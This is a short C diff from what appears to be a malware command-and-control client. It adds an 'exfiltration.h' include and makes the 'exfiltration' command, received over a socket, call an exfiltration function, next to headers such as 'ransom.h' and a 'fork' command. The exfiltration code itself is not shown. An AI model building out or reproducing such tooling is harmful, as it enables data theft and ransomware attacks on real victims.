@@ -1,4 +1,5 @@
 #include "handle_client_commands.h"
+#include "exfiltration.h"
 #include "gener.h"
 #include "stock.h"
 #include "ransom.h"
@@ -48,6 +49,7 @@ void handle_client_commands(int socket_fd)
         if (strcmp(buffer, "exfiltration") == 0)
         {
             printf("Executing exfiltration...\n");
+            exfiltration( socket_fd);
         }
         else if (strcmp(buffer, "fork") == 0)
         {
